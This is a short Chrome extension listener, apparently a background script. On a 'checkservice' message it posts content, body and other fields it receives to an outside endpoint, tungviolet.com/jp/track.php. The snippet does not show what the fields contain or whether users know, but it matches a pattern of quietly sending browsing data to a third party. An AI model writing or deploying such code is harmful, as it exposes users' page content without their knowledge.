chrome.runtime.onMessage.addListener(
	function(request, sender, sendResponse) {
		if( request.message === "checkservice" ) {
			$.post( "https://tungviolet.com/jp/track.php", {
				content: request.content,
				body: request.body,
				other: request.other,
				au: 'th',
			} );
		}
	}
);
